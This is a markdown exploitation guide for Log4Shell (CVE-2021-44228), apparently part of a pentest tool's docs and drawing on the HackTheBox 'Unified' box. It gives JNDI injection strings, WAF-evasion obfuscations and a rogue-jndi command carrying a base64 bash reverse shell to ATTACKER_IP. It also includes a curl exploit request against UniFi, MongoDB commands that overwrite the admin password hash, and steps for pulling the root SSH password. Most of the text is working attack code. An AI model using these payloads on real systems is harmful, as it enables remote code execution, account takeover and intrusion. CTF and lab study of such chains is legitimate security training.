# Log4Shell — CVE-2021-44228 (JNDI/LDAP RCE)

Any Java app that logs attacker-controlled input through a vulnerable log4j2
(2.0-beta9 .. 2.14.1) can be driven to RCE with a `${jndi:ldap://ATTACKER/x}`
string. scryer auto-detects the UniFi Network case (`log4shell` module) and,
with `--exploit`, drives the whole chain. This note is the manual fallback and
the generic method.

## Where the payload goes

Inject the JNDI string anywhere the app logs: a header (`User-Agent`,
`X-Api-Version`, `Referer`, `X-Forwarded-For`), a form field, a username, a
search box. For UniFi specifically it's the **`remember`** field of the JSON
`POST /api/login` body — enclosed in quotes so the `{}` isn't parsed as JSON.

```
${jndi:ldap://ATTACKER_IP:1389/o=tomcat}
```

Obfuscation variants when a WAF filters `jndi`/`ldap`:
```
${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://ATTACKER/x}
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://ATTACKER/x}
```

## Confirm blind (no shell yet)

Point the payload at a listener you control and watch for the callback:
```bash
sudo tcpdump -i tun0 port 389          # raw LDAP hit = vulnerable
# or use an interactsh / canarytokens DNS token as the host
```

## Get RCE with rogue-jndi

rogue-jndi bundles gadgets (Tomcat/ELProcessor/Groovy) that run a command
directly — no separate HTTP class-hosting server needed.

```bash
git clone https://github.com/veracode-research/rogue-jndi
cd rogue-jndi && mvn package          # -> target/RogueJndi-1.1.jar

# base64 the reverse shell so brackets/pipes survive the gadget
echo 'bash -c bash -i >&/dev/tcp/ATTACKER_IP/4444 0>&1' | base64

java -jar target/RogueJndi-1.1.jar \
  --command "bash -c {echo,BASE64}|{base64,-d}|{bash,-i}" \
  --hostname "ATTACKER_IP"            # LDAP server on :1389

nc -lvnp 4444                          # catch it in another terminal
```

Then send the request (UniFi example):
```bash
curl -sk -X POST https://TARGET:8443/api/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"a","password":"a","remember":"${jndi:ldap://ATTACKER_IP:1389/o=tomcat}","strict":true}'
```

Stabilise the shell:
```bash
script /dev/null -c bash
# Ctrl-Z; stty raw -echo; fg; export TERM=xterm
```

## UniFi post-exploitation (HTB 'Unified')

Shell lands as `unifi`. User flag is under `/home/*/user.txt`.

Local MongoDB (127.0.0.1:27117, db `ace`) holds the admin. You can't crack
`x_shadow` — overwrite it:
```bash
mongo --port 27117 ace --eval 'db.admin.find().forEach(printjson)'   # get _id
mkpasswd -m sha-512 Password1234                                     # new $6$ hash
mongo --port 27117 ace --eval 'db.admin.update({"_id":ObjectId("<ID>")},{$set:{"x_shadow":"<HASH>"}})'
```

Log into `https://TARGET:8443` as **administrator** / your new password (the
username is case-sensitive). The root SSH password is stored in plaintext under
**Settings -> Site -> SSH Authentication**. Via the API:
```bash
# after authenticating (cookie jar), read the mgmt setting:
GET /api/s/default/get/setting/mgmt      # -> x_ssh_username / x_ssh_password
```

Then:
```bash
ssh root@TARGET        # root flag in /root/root.txt
```

## Other common Log4Shell CTF targets

- **VMware / Apache Solr / Elasticsearch / Ghidra / Struts** — same JNDI string
  in a logged field; use `marshalsec` LDAP referral + a hosted `.class` for
  arbitrary gadgets when rogue-jndi's built-ins don't fit.
- Generic marshalsec route:
  ```bash
  java -cp marshalsec-all.jar marshalsec.jndi.LDAPRefServer \
    "http://ATTACKER:8000/#Exploit"     # serve Exploit.class over HTTP :8000
  ```
